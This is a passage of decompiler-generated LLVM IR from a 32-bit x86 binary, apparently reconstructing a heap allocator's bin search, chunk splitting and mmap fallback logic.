dec_label_pc_8051a88:                             ; preds = %dec_label_pc_8051a2e, %dec_label_pc_8051a5c, %dec_label_pc_8051a3f, %dec_label_pc_8051a85
  %v0_8051a88 = phi i32 [ %v0_8051a41, %dec_label_pc_8051a3f ], [ %v0_8051a41, %dec_label_pc_8051a85 ], [ %v0_8051a41, %dec_label_pc_8051a5c ], [ %v2_8051a30, %dec_label_pc_8051a2e ]
  %stack_var_-64.1 = phi i32 [ %v2_8051a48, %dec_label_pc_8051a3f ], [ %v0_8051a85.lcssa, %dec_label_pc_8051a85 ], [ %v2_8051a48, %dec_label_pc_8051a5c ], [ %v3_8051a3a, %dec_label_pc_8051a2e ]
  %v1_8051a8a = urem i32 %v0_8051a88, 32
  %v2_8051a8a = icmp eq i32 %v1_8051a8a, 0
  store i32 %v1_8051a8a, i32* %esi.global-to-local, align 4
  store i32 %v1_8051a8a, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8051a94 = sdiv i32 %v0_8051a88, 32
  store i32 %v2_8051a94, i32* %edx.global-to-local, align 4
  br i1 %v2_8051a8a, label %dec_label_pc_8051ab0, label %bb

bb:                                               ; preds = %dec_label_pc_8051a88
  %v5_8051a97 = shl i32 1, %v1_8051a8a
  store i32 %v5_8051a97, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ab0

dec_label_pc_8051ab0:                             ; preds = %dec_label_pc_8051a88, %bb
  %v5_8051a99 = phi i32 [ 1, %dec_label_pc_8051a88 ], [ %v5_8051a97, %bb ]
  %v1_8051a99 = mul nsw i32 %v2_8051a94, 4
  %v2_8051a99 = add i32 %v1_8051a99, ptrtoint (i32* @global_var_8055654.37 to i32)
  %v3_8051a99 = inttoptr i32 %v2_8051a99 to i32*
  %v4_8051a99 = load i32, i32* %v3_8051a99, align 4
  %v6_8051a99 = or i32 %v4_8051a99, %v5_8051a99
  store i32 %v6_8051a99, i32* %v3_8051a99, align 4
  %v0_8051aa0 = load i32, i32* @ebx, align 4
  %v1_8051aa0 = load i32, i32* @ebp, align 4
  %v2_8051aa0 = add i32 %v1_8051aa0, 12
  %v3_8051aa0 = inttoptr i32 %v2_8051aa0 to i32*
  store i32 %v0_8051aa0, i32* %v3_8051aa0, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8051aa7 = load i32, i32* @ebp, align 4
  %v2_8051aa7 = add i32 %v1_8051aa7, 8
  %v3_8051aa7 = inttoptr i32 %v2_8051aa7 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8051aa7, align 4
  %v0_8051aaa = load i32, i32* @ebp, align 4
  %v1_8051aaa = load i32, i32* @ebx, align 4
  %v2_8051aaa = add i32 %v1_8051aaa, 8
  %v3_8051aaa = inttoptr i32 %v2_8051aaa to i32*
  store i32 %v0_8051aaa, i32* %v3_8051aaa, align 4
  %v0_8051aad = load i32, i32* @ebp, align 4
  %v1_8051aad = load i32, i32* @esi, align 4
  %v2_8051aad = add i32 %v1_8051aad, 12
  %v3_8051aad = inttoptr i32 %v2_8051aad to i32*
  store i32 %v0_8051aad, i32* %v3_8051aad, align 4
  %v0_8051ab0 = load i32, i32* @global_var_8055360.36, align 32
  store i32 %v0_8051ab0, i32* @ebp, align 4
  %v9_8051ab6 = icmp eq i32 %v0_8051ab0, 134566740
  %v1_8051abc = icmp eq i1 %v9_8051ab6, false
  br i1 %v1_8051abc, label %dec_label_pc_80519df, label %dec_label_pc_8051ac2

dec_label_pc_8051ac2:                             ; preds = %dec_label_pc_8051ab0, %dec_label_pc_8051ab0.preheader
  br i1 %v8_8051973, label %dec_label_pc_8051b50, label %dec_label_pc_8051ad0

dec_label_pc_8051ad0:                             ; preds = %dec_label_pc_8051ac2
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8051ad4 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8051ad4 = add i32 %v1_8051ad4, ptrtoint (i32* @global_var_805534c.33 to i32)
  store i32 %v2_8051ad4, i32* %edx.global-to-local, align 4
  %v1_8051adb = add i32 %v1_8051ad4, add (i32 ptrtoint (i32* @global_var_805534c.33 to i32), i32 12)
  %v2_8051adb = inttoptr i32 %v1_8051adb to i32*
  %storemerge1.pre = load i32, i32* %v2_8051adb, align 4
  br label %dec_label_pc_8051b4c

dec_label_pc_8051ae0:                             ; preds = %dec_label_pc_8051b4c
  %v1_8051ae0 = add i32 %v4_8051af7, 4
  %v2_8051ae0 = inttoptr i32 %v1_8051ae0 to i32*
  %v3_8051ae0 = load i32, i32* %v2_8051ae0, align 4
  store i32 %v3_8051ae0, i32* %ebx.global-to-local, align 4
  %v1_8051ae3 = add i32 %v4_8051af7, 12
  %v2_8051ae3 = inttoptr i32 %v1_8051ae3 to i32*
  %v3_8051ae3 = load i32, i32* %v2_8051ae3, align 4
  store i32 %v3_8051ae3, i32* @ecx, align 4
  %v1_8051ae6 = and i32 %v3_8051ae0, -4
  store i32 %v1_8051ae6, i32* @ebx, align 4
  %v10_8051ae9 = icmp ult i32 %v1_8051ae6, %.v1_8051923
  br i1 %v10_8051ae9, label %dec_label_pc_8051b4c, label %dec_label_pc_8051aef

dec_label_pc_8051aef:                             ; preds = %dec_label_pc_8051ae0
  %v1_8051aef = add i32 %v4_8051af7, 8
  %v2_8051aef = inttoptr i32 %v1_8051aef to i32*
  %v3_8051aef = load i32, i32* %v2_8051aef, align 4
  store i32 %v3_8051aef, i32* @edx, align 4
  %v1_8051af2 = add i32 %v3_8051aef, 12
  %v2_8051af2 = inttoptr i32 %v1_8051af2 to i32*
  %v3_8051af2 = load i32, i32* %v2_8051af2, align 4
  %v15_8051af2 = icmp eq i32 %v3_8051af2, %v4_8051af7
  %v1_8051af5 = icmp eq i1 %v15_8051af2, false
  br i1 %v1_8051af5, label %dec_label_pc_8051afc, label %dec_label_pc_8051af7

dec_label_pc_8051af7:                             ; preds = %dec_label_pc_8051aef
  %v1_8051af7 = add i32 %v3_8051ae3, 8
  %v2_8051af7 = inttoptr i32 %v1_8051af7 to i32*
  %v3_8051af7 = load i32, i32* %v2_8051af7, align 4
  %v15_8051af7 = icmp eq i32 %v3_8051af7, %v4_8051af7
  br i1 %v15_8051af7, label %dec_label_pc_8051b01, label %dec_label_pc_8051afc

dec_label_pc_8051afc:                             ; preds = %dec_label_pc_8051af7, %dec_label_pc_8051aef
  %v0_8051afc = call i32 @function_805282f()
  store i32 %v0_8051afc, i32* %eax.global-to-local, align 4
  %v0_8051b01.pre = load i32, i32* @ebx, align 4
  %v0_8051b07.pre = load i32, i32* @ecx, align 4
  %v1_8051b07.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051b01

dec_label_pc_8051b01:                             ; preds = %dec_label_pc_8051af7, %dec_label_pc_8051afc
  %v1_8051b07 = phi i32 [ %v3_8051aef, %dec_label_pc_8051af7 ], [ %v1_8051b07.pre, %dec_label_pc_8051afc ]
  %v0_8051b07 = phi i32 [ %v3_8051ae3, %dec_label_pc_8051af7 ], [ %v0_8051b07.pre, %dec_label_pc_8051afc ]
  %v0_8051b01 = phi i32 [ %v1_8051ae6, %dec_label_pc_8051af7 ], [ %v0_8051b01.pre, %dec_label_pc_8051afc ]
  %v5_8051b03 = sub i32 %v0_8051b01, %.v1_8051923
  store i32 %v5_8051b03, i32* %esi.global-to-local, align 4
  %v2_8051b07 = add i32 %v1_8051b07, 12
  %v3_8051b07 = inttoptr i32 %v2_8051b07 to i32*
  store i32 %v0_8051b07, i32* %v3_8051b07, align 4
  %v0_8051b0a = load i32, i32* @edx, align 4
  %v1_8051b0a = load i32, i32* @ecx, align 4
  %v2_8051b0a = add i32 %v1_8051b0a, 8
  %v3_8051b0a = inttoptr i32 %v2_8051b0a to i32*
  store i32 %v0_8051b0a, i32* %v3_8051b0a, align 4
  %v0_8051b0d = load i32, i32* %esi.global-to-local, align 4
  %v0_8051b10 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b10 = add i32 %v0_8051b10, 8
  store i32 %v1_8051b10, i32* %ecx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_8051b0d, 16
  br i1 %tmp125, label %dec_label_pc_8052011, label %dec_label_pc_8051b19

dec_label_pc_8051b19:                             ; preds = %dec_label_pc_8051b01
  %v2_8051b1d = add i32 %v0_8051b10, %.v1_8051923
  store i32 %v2_8051b1d, i32* @edx, align 4
  %v1_8051b20 = or i32 %.v1_8051923, 1
  store i32 %v1_8051b20, i32* %ebx.global-to-local, align 4
  %v2_8051b23 = add i32 %v0_8051b10, 4
  %v3_8051b23 = inttoptr i32 %v2_8051b23 to i32*
  store i32 %v1_8051b20, i32* %v3_8051b23, align 4
  %v0_8051b26 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051b28 = or i32 %v0_8051b26, 1
  store i32 %v1_8051b28, i32* %eax.global-to-local, align 4
  %v0_8051b2b = load i32, i32* @edx, align 4
  %v1_8051b2b = load i32, i32* @ebp, align 4
  %v2_8051b2b = add i32 %v1_8051b2b, 8
  %v3_8051b2b = inttoptr i32 %v2_8051b2b to i32*
  store i32 %v0_8051b2b, i32* %v3_8051b2b, align 4
  %v0_8051b2e = load i32, i32* @edx, align 4
  %v1_8051b2e = load i32, i32* @ebp, align 4
  %v2_8051b2e = add i32 %v1_8051b2e, 12
  %v3_8051b2e = inttoptr i32 %v2_8051b2e to i32*
  store i32 %v0_8051b2e, i32* %v3_8051b2e, align 4
  %v0_8051b31 = load i32, i32* @edx, align 4
  %v1_8051b31 = add i32 %v0_8051b31, 8
  %v2_8051b31 = inttoptr i32 %v1_8051b31 to i32*
  store i32 ptrtoint (i32* @global_var_8055354.35 to i32), i32* %v2_8051b31, align 4
  %v0_8051b38 = load i32, i32* @edx, align 4
  %v1_8051b38 = add i32 %v0_8051b38, 12
  %v2_8051b38 = inttoptr i32 %v1_8051b38 to i32*
  store i32 ptrtoint (i32* @global_var_8055354.35 to i32), i32* %v2_8051b38, align 4
  %v0_8051b3f = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b3f = load i32, i32* @edx, align 4
  %v2_8051b3f = add i32 %v1_8051b3f, 4
  %v3_8051b3f = inttoptr i32 %v2_8051b3f to i32*
  store i32 %v0_8051b3f, i32* %v3_8051b3f, align 4
  %v0_8051b42 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051b42 = load i32, i32* @edx, align 4
  %v3_8051b42 = add i32 %v1_8051b42, %v0_8051b42
  %v4_8051b42 = inttoptr i32 %v3_8051b42 to i32*
  store i32 %v0_8051b42, i32* %v4_8051b42, align 4
  br label %dec_label_pc_8052016

dec_label_pc_8051b4c:                             ; preds = %dec_label_pc_8051ae0, %dec_label_pc_8051ad0
  %v4_8051af7 = phi i32 [ %storemerge1.pre, %dec_label_pc_8051ad0 ], [ %v3_8051ae3, %dec_label_pc_8051ae0 ]
  store i32 %v4_8051af7, i32* %eax.global-to-local, align 4
  %v12_8051b4c = icmp eq i32 %v4_8051af7, %v2_8051ad4
  %v1_8051b4e = icmp eq i1 %v12_8051b4c, false
  br i1 %v1_8051b4e, label %dec_label_pc_8051ae0, label %dec_label_pc_8051b50

dec_label_pc_8051b50:                             ; preds = %dec_label_pc_8051b4c, %dec_label_pc_8051ac2
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8051b59 = add i32 %stack_var_-40.0.ph, 1
  %v2_8051b5c = udiv i32 %v1_8051b59, 32
  store i32 %v2_8051b5c, i32* @edi, align 4
  %v1_8051b5f = mul i32 %v1_8051b59, 8
  %v2_8051b5f = add i32 %v1_8051b5f, ptrtoint (i32* @global_var_805534c.33 to i32)
  store i32 %v2_8051b5f, i32* %ebx.global-to-local, align 4
  %v1_8051b66 = urem i32 %v1_8051b59, 32
  %v2_8051b66 = icmp eq i32 %v1_8051b66, 0
  store i32 %v1_8051b66, i32* %ecx.global-to-local, align 4
  %v1_8051b69 = mul nuw nsw i32 %v2_8051b5c, 4
  %v2_8051b69 = add i32 %v1_8051b69, ptrtoint (i32* @global_var_8055654.37 to i32)
  %v3_8051b69 = inttoptr i32 %v2_8051b69 to i32*
  %v4_8051b69 = load i32, i32* %v3_8051b69, align 4
  store i32 %v4_8051b69, i32* %edx.global-to-local, align 4
  br i1 %v2_8051b66, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_8051b50
  %v5_8051b70 = shl i32 1, %v1_8051b66
  store i32 %v5_8051b70, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8051b50, %bb88, %dec_label_pc_8051bb1
  %v1_8051b72 = phi i32 [ %v1_8051b72.pre, %dec_label_pc_8051bb1 ], [ %v4_8051b69, %bb88 ], [ %v4_8051b69, %dec_label_pc_8051b50 ]
  %v0_8051b76 = phi i32 [ %v0_8051b72.pre, %dec_label_pc_8051bb1 ], [ %v5_8051b70, %bb88 ], [ 1, %dec_label_pc_8051b50 ]
  %tmp89 = icmp ule i32 %v0_8051b76, %v1_8051b72
  %v1_8051b76 = icmp eq i32 %v0_8051b76, 0
  %v1_8051b78 = icmp eq i1 %v1_8051b76, false
  %or.cond = and i1 %tmp89, %v1_8051b78
  br i1 %or.cond, label %dec_label_pc_8051b76.dec_label_pc_8051ba6.preheader_crit_edge, label %dec_label_pc_8051b7a.preheader

dec_label_pc_8051b76.dec_label_pc_8051ba6.preheader_crit_edge: ; preds = %.preheader
  %v0_8051ba17.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ba6.preheader

dec_label_pc_8051b7a.preheader:                   ; preds = %.preheader
  %v0_8051b7a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051b7a

dec_label_pc_8051b7a:                             ; preds = %dec_label_pc_8051b7a.preheader, %dec_label_pc_8051b84
  %v0_8051b7a = phi i32 [ %v0_8051b7a.pre, %dec_label_pc_8051b7a.preheader ], [ %v1_8051b7a, %dec_label_pc_8051b84 ]
  %v1_8051b7a = add i32 %v0_8051b7a, 1
  store i32 %v1_8051b7a, i32* @edi, align 4
  %v6_8051b7e = icmp ugt i32 %v1_8051b7a, 2
  br i1 %v6_8051b7e, label %dec_label_pc_8051c2d, label %dec_label_pc_8051b84

dec_label_pc_8051b84:                             ; preds = %dec_label_pc_8051b7a
  %v1_8051b84 = mul i32 %v1_8051b7a, 4
  %v2_8051b84 = add i32 %v1_8051b84, ptrtoint (i32* @global_var_8055654.37 to i32)
  %v3_8051b84 = inttoptr i32 %v2_8051b84 to i32*
  %v4_8051b84 = load i32, i32* %v3_8051b84, align 4
  store i32 %v4_8051b84, i32* %edx.global-to-local, align 4
  %v1_8051b8b = icmp eq i32 %v4_8051b84, 0
  br i1 %v1_8051b8b, label %dec_label_pc_8051b7a, label %dec_label_pc_8051b8f

dec_label_pc_8051b8f:                             ; preds = %dec_label_pc_8051b84
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8051b96 = mul i32 %v1_8051b7a, 256
  store i32 %v2_8051b96, i32* %eax.global-to-local, align 4
  %v1_8051b99 = add i32 %v2_8051b96, ptrtoint (i32* @global_var_805534c.33 to i32)
  store i32 %v1_8051b99, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ba6.preheader

dec_label_pc_8051ba6.preheader:                   ; preds = %dec_label_pc_8051b76.dec_label_pc_8051ba6.preheader_crit_edge, %dec_label_pc_8051b8f
  %v0_8051ba17 = phi i32 [ %v1_8051b99, %dec_label_pc_8051b8f ], [ %v0_8051ba17.pre, %dec_label_pc_8051b76.dec_label_pc_8051ba6.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8051b8f ], [ %v0_8051b76, %dec_label_pc_8051b76.dec_label_pc_8051ba6.preheader_crit_edge ]
  %v0_8051bb8 = phi i32 [ %v4_8051b84, %dec_label_pc_8051b8f ], [ %v1_8051b72, %dec_label_pc_8051b76.dec_label_pc_8051ba6.preheader_crit_edge ]
  %v2_8051ba64 = and i32 %v0_8051bb8, %esi.promoted
  %v3_8051ba65 = icmp eq i32 %v2_8051ba64, 0
  br i1 %v3_8051ba65, label %dec_label_pc_8051ba1, label %dec_label_pc_8051baa

dec_label_pc_8051ba1:                             ; preds = %dec_label_pc_8051ba6.preheader, %dec_label_pc_8051ba1
  %v2_8051ba418 = phi i32 [ %v2_8051ba4, %dec_label_pc_8051ba1 ], [ %esi.promoted, %dec_label_pc_8051ba6.preheader ]
  %v0_8051ba18 = phi i32 [ %v1_8051ba1, %dec_label_pc_8051ba1 ], [ %v0_8051ba17, %dec_label_pc_8051ba6.preheader ]
  %v1_8051ba1 = add i32 %v0_8051ba18, 8
  %v2_8051ba4 = mul i32 %v2_8051ba418, 2
  %v2_8051ba6 = and i32 %v2_8051ba4, %v0_8051bb8
  %v3_8051ba6 = icmp eq i32 %v2_8051ba6, 0
  br i1 %v3_8051ba6, label %dec_label_pc_8051ba1, label %dec_label_pc_8051ba6.dec_label_pc_8051baa_crit_edge

dec_label_pc_8051ba6.dec_label_pc_8051baa_crit_edge: ; preds = %dec_label_pc_8051ba1
  store i32 %v1_8051ba1, i32* %ebx.global-to-local, align 4
  store i32 %v2_8051ba4, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051baa

dec_label_pc_8051baa:                             ; preds = %dec_label_pc_8051ba6.dec_label_pc_8051baa_crit_edge, %dec_label_pc_8051ba6.preheader
  %v0_8051bba = phi i32 [ %v2_8051ba4, %dec_label_pc_8051ba6.dec_label_pc_8051baa_crit_edge ], [ %esi.promoted, %dec_label_pc_8051ba6.preheader ]
  %v1_8051bd4 = phi i32 [ %v1_8051ba1, %dec_label_pc_8051ba6.dec_label_pc_8051baa_crit_edge ], [ %v0_8051ba17, %dec_label_pc_8051ba6.preheader ]
  %v1_8051baa = add i32 %v1_8051bd4, 12
  %v2_8051baa = inttoptr i32 %v1_8051baa to i32*
  %v3_8051baa = load i32, i32* %v2_8051baa, align 4
  store i32 %v3_8051baa, i32* %ecx.global-to-local, align 4
  %v12_8051bad = icmp eq i32 %v3_8051baa, %v1_8051bd4
  %v1_8051baf = icmp eq i1 %v12_8051bad, false
  br i1 %v1_8051baf, label %dec_label_pc_8051bc5, label %dec_label_pc_8051bb1

dec_label_pc_8051bb1:                             ; preds = %dec_label_pc_8051baa
  %v1_8051bb3 = add i32 %v3_8051baa, 8
  store i32 %v1_8051bb3, i32* %ebx.global-to-local, align 4
  %v1_8051bb6 = sub i32 -1, %v0_8051bba
  store i32 %v1_8051bb6, i32* %eax.global-to-local, align 4
  %v2_8051bb8 = and i32 %v0_8051bb8, %v1_8051bb6
  store i32 %v2_8051bb8, i32* %edx.global-to-local, align 4
  %v2_8051bba = mul i32 %v0_8051bba, 2
  store i32 %v2_8051bba, i32* %esi.global-to-local, align 4
  %v1_8051bbc = load i32, i32* @edi, align 4
  %v2_8051bbc = mul i32 %v1_8051bbc, 4
  %v3_8051bbc = add i32 %v2_8051bbc, ptrtoint (i32* @global_var_8055654.37 to i32)
  %v4_8051bbc = inttoptr i32 %v3_8051bbc to i32*
  store i32 %v2_8051bb8, i32* %v4_8051bbc, align 4
  %v0_8051b72.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8051b72.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8051bc5:                             ; preds = %dec_label_pc_8051baa
  %v1_8051bc5 = add i32 %v3_8051baa, 4
  %v2_8051bc5 = inttoptr i32 %v1_8051bc5 to i32*
  %v3_8051bc5 = load i32, i32* %v2_8051bc5, align 4
  store i32 %v3_8051bc5, i32* %edx.global-to-local, align 4
  %v1_8051bc8 = add i32 %v3_8051baa, 12
  %v2_8051bc8 = inttoptr i32 %v1_8051bc8 to i32*
  %v3_8051bc8 = load i32, i32* %v2_8051bc8, align 4
  store i32 %v3_8051bc8, i32* %eax.global-to-local, align 4
  %v1_8051bcb = and i32 %v3_8051bc5, -4
  store i32 %v1_8051bcb, i32* @edx, align 4
  %v5_8051bd0 = sub i32 %v1_8051bcb, %.v1_8051923
  store i32 %v5_8051bd0, i32* %esi.global-to-local, align 4
  store i32 %v3_8051bc8, i32* %v2_8051baa, align 4
  %v0_8051bd7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051bd7 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051bd7 = add i32 %v1_8051bd7, 8
  %v3_8051bd7 = inttoptr i32 %v2_8051bd7 to i32*
  store i32 %v0_8051bd7, i32* %v3_8051bd7, align 4
  %v0_8051bda = load i32, i32* %esi.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8051bda, 16
  br i1 %tmp126, label %dec_label_pc_8051bdf, label %dec_label_pc_8051be6

dec_label_pc_8051bdf:                             ; preds = %dec_label_pc_8051bc5
  %v0_8051bdf = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051bdf = load i32, i32* @edx, align 4
  %v2_8051bdf = add i32 %v0_8051bdf, 4
  %v3_8051bdf = add i32 %v2_8051bdf, %v1_8051bdf
  %v4_8051bdf = inttoptr i32 %v3_8051bdf to i32*
  %v5_8051bdf = load i32, i32* %v4_8051bdf, align 4
  %v6_8051bdf = or i32 %v5_8051bdf, 1
  store i32 %v6_8051bdf, i32* %v4_8051bdf, align 4
  br label %dec_label_pc_8051c25

dec_label_pc_8051be6:                             ; preds = %dec_label_pc_8051bc5
  store i32 %.v1_8051923, i32* %eax.global-to-local, align 4
  %v0_8051bef = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051bef = add i32 %v0_8051bef, %.v1_8051923
  store i32 %v2_8051bef, i32* @edx, align 4
  %v1_8051bf2 = load i32, i32* @ebp, align 4
  %v2_8051bf2 = add i32 %v1_8051bf2, 8
  %v3_8051bf2 = inttoptr i32 %v2_8051bf2 to i32*
  store i32 %v2_8051bef, i32* %v3_8051bf2, align 4
  %v0_8051bf5 = load i32, i32* @edx, align 4
  %v1_8051bf5 = load i32, i32* @ebp, align 4
  %v2_8051bf5 = add i32 %v1_8051bf5, 12
  %v3_8051bf5 = inttoptr i32 %v2_8051bf5 to i32*
  store i32 %v0_8051bf5, i32* %v3_8051bf5, align 4
  %v0_8051bf8 = load i32, i32* @edx, align 4
  %v1_8051bf8 = add i32 %v0_8051bf8, 8
  %v2_8051bf8 = inttoptr i32 %v1_8051bf8 to i32*
  store i32 ptrtoint (i32* @global_var_8055354.35 to i32), i32* %v2_8051bf8, align 4
  %v0_8051bff = load i32, i32* @edx, align 4
  %v1_8051bff = add i32 %v0_8051bff, 12
  %v2_8051bff = inttoptr i32 %v1_8051bff to i32*
  store i32 ptrtoint (i32* @global_var_8055354.35 to i32), i32* %v2_8051bff, align 4
  br i1 %v6_805197b, label %dec_label_pc_8051c0e, label %dec_label_pc_8051c08

dec_label_pc_8051c08:                             ; preds = %dec_label_pc_8051be6
  %v0_8051c08 = load i32, i32* @edx, align 4
  store i32 %v0_8051c08, i32* @global_var_8055350.34, align 16
  br label %dec_label_pc_8051c0e

dec_label_pc_8051c0e:                             ; preds = %dec_label_pc_8051be6, %dec_label_pc_8051c08
  %v4_8051c0e = or i32 %.v1_8051923, 1
  %v0_8051c13 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8051c0e, i32* %ebx.global-to-local, align 4
  %v1_8051c19 = or i32 %v0_8051c13, 1
  store i32 %v1_8051c19, i32* %eax.global-to-local, align 4
  %v1_8051c1c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051c1c = add i32 %v1_8051c1c, 4
  %v3_8051c1c = inttoptr i32 %v2_8051c1c to i32*
  store i32 %v4_8051c0e, i32* %v3_8051c1c, align 4
  %v0_8051c1f = load i32, i32* %esi.global-to-local, align 4
  %v1_8051c1f = load i32, i32* @edx, align 4
  %v3_8051c1f = add i32 %v1_8051c1f, %v0_8051c1f
  %v4_8051c1f = inttoptr i32 %v3_8051c1f to i32*
  store i32 %v0_8051c1f, i32* %v4_8051c1f, align 4
  %v0_8051c22 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051c22 = load i32, i32* @edx, align 4
  %v2_8051c22 = add i32 %v1_8051c22, 4
  %v3_8051c22 = inttoptr i32 %v2_8051c22 to i32*
  store i32 %v0_8051c22, i32* %v3_8051c22, align 4
  br label %dec_label_pc_8051c25

dec_label_pc_8051c25:                             ; preds = %dec_label_pc_8051bdf, %dec_label_pc_8051c0e
  %v0_8051c25 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051c25 = add i32 %v0_8051c25, 8
  store i32 %v1_8051c25, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052027

dec_label_pc_8051c2d:                             ; preds = %dec_label_pc_8051b7a, %dec_label_pc_8051935, %dec_label_pc_805193d
  %v0_8051c2d = load i32, i32* @global_var_805534c.33, align 4
  store i32 %v0_8051c2d, i32* @ebx, align 4
  %v1_8051c37 = add i32 %.v1_8051923, 16
  store i32 %v1_8051c37, i32* @esi, align 4
  %v1_8051c3a = add i32 %v0_8051c2d, 4
  %v2_8051c3a = inttoptr i32 %v1_8051c3a to i32*
  %v3_8051c3a = load i32, i32* %v2_8051c3a, align 4
  %v1_8051c41 = and i32 %v3_8051c3a, -4
  store i32 %v1_8051c41, i32* %ecx.global-to-local, align 4
  %v7_8051c44 = icmp ult i32 %v1_8051c41, %v1_8051c37
  br i1 %v7_8051c44, label %dec_label_pc_8051c64, label %dec_label_pc_8051c48

dec_label_pc_8051c48:                             ; preds = %dec_label_pc_8051c2d
  %v2_8051c4c = add i32 %v0_8051c2d, %.v1_8051923
  store i32 %v2_8051c4c, i32* @edx, align 4
  %v1_8051c4f = or i32 %.v1_8051923, 1
  store i32 %v1_8051c4f, i32* %eax.global-to-local, align 4
  store i32 %v2_8051c4c, i32* @global_var_805534c.33, align 4
  store i32 %v1_8051c4f, i32* %v2_8051c3a, align 4
  %v0_8051c5b = load i32, i32* %ecx.global-to-local, align 4
  %v5_8051c5b = sub i32 %v0_8051c5b, %.v1_8051923
  store i32 %v5_8051c5b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051fb7

dec_label_pc_8051c64:                             ; preds = %dec_label_pc_8051c2d
  %v0_8051c64 = load i32, i32* @global_var_805567c.38, align 4
  store i32 %v0_8051c64, i32* %edx.global-to-local, align 4
  %v0_8051c6a = load i8, i8* @global_var_8055320.32, align 32
  %v1_8051c6a = and i8 %v0_8051c6a, 2
  %v2_8051c6a = icmp eq i8 %v1_8051c6a, 0
  br i1 %v2_8051c6a, label %dec_label_pc_8051c98, label %dec_label_pc_8051c73

dec_label_pc_8051c73:                             ; preds = %dec_label_pc_8051c64
  store i32 ptrtoint (i8* @global_var_8055320.32 to i32), i32* %stack_var_-92, align 4
  %v2_8051c7b = call i32 @function_80524eb(i32* bitcast (i8* @global_var_8055320.32 to i32*))
  store i32 ptrtoint (i8* @global_var_8055320.32 to i32), i32* @ebx, align 4
  %v1_8051c85 = add i32 %.v1_8051923, -7
  store i32 %v1_8051c85, i32* %eax.global-to-local, align 4
  store i32 %v1_8051c85, i32* %stack_var_-92, align 4
  %v1_8051c89 = call i32 @function_80518ce(i32 %v1_8051c85)
  store i32 %v1_8051c89, i32* %eax.global-to-local, align 4
  store i32 %v1_8051c89, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052027

dec_label_pc_8051c98:                             ; preds = %dec_label_pc_8051c64
  %v1_8051c98 = add i32 %v0_8051c64, -1
  store i32 %v1_8051c98, i32* @ecx, align 4
  store i32 %.v1_8051923, i32* @ebx, align 4
  %v1_8051ca3 = load i32, i32* @global_var_805566c.39, align 4
  %v7_8051ca3 = icmp ult i32 %.v1_8051923, %v1_8051ca3
  br i1 %v7_8051ca3, label %dec_label_pc_8051d65, label %dec_label_pc_8051caf

dec_label_pc_8051caf:                             ; preds = %dec_label_pc_8051c98
  %v0_8051caf = load i32, i32* @global_var_8055670.40, align 16
  store i32 %v0_8051caf, i32* %eax.global-to-local, align 4
  %v1_8051cb4 = load i32, i32* @global_var_8055674.41, align 4
  %v5_8051cba = icmp slt i32 %v0_8051caf, %v1_8051cb4
  br i1 %v5_8051cba, label %dec_label_pc_8051cc0, label %dec_label_pc_8051d65

dec_label_pc_8051cc0:                             ; preds = %dec_label_pc_8051caf
  %v2_8051cc2 = add i32 %.v1_8051923, 10
  %v3_8051cc2 = add i32 %v2_8051cc2, %v0_8051c64
  %v1_8051cc6 = sub i32 0, %v0_8051c64
  store i32 %v1_8051cc6, i32* %eax.global-to-local, align 4
  %v2_8051cc8 = and i32 %v3_8051cc2, %v1_8051cc6
  store i32 %v2_8051cc8, i32* @ebx, align 4
  %tmp127 = icmp ugt i32 %v2_8051cc8, %.v1_8051923
  br i1 %tmp127, label %dec_label_pc_8051cd4, label %dec_label_pc_8051d65

dec_label_pc_8051cd4:                             ; preds = %dec_label_pc_8051cc0
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8051ce1 = call i32 @function_8053110(i32 0, i32 %v2_8051cc8, i32 3, i32 34, i32 0, i32 0, i32 %v1_8051c98, i32 %v1_8051c98)
  store i32 %v8_8051ce1, i32* %eax.global-to-local, align 4
  store i32 %v8_8051ce1, i32* @edx, align 4
  %v10_8051ceb = icmp eq i32 %v8_8051ce1, -1
  br i1 %v10_8051ceb, label %dec_label_pc_8051cd4.dec_label_pc_8051d65_crit_edge, label %dec_label_pc_8051cf0

dec_label_pc_8051cd4.dec_label_pc_8051d65_crit_edge: ; preds = %dec_label_pc_8051cd4
  %v0_8051d65.pre = load i32, i32* @global_var_805534c.33, align 4
  br label %dec_label_pc_8051d65

dec_label_pc_8051cf0:                             ; preds = %dec_label_pc_8051cd4
  %v1_8051cf2 = urem i32 %v8_8051ce1, 8
  %v2_8051cf2 = icmp eq i32 %v1_8051cf2, 0
  store i32 %v1_8051cf2, i32* %ecx.global-to-local, align 4
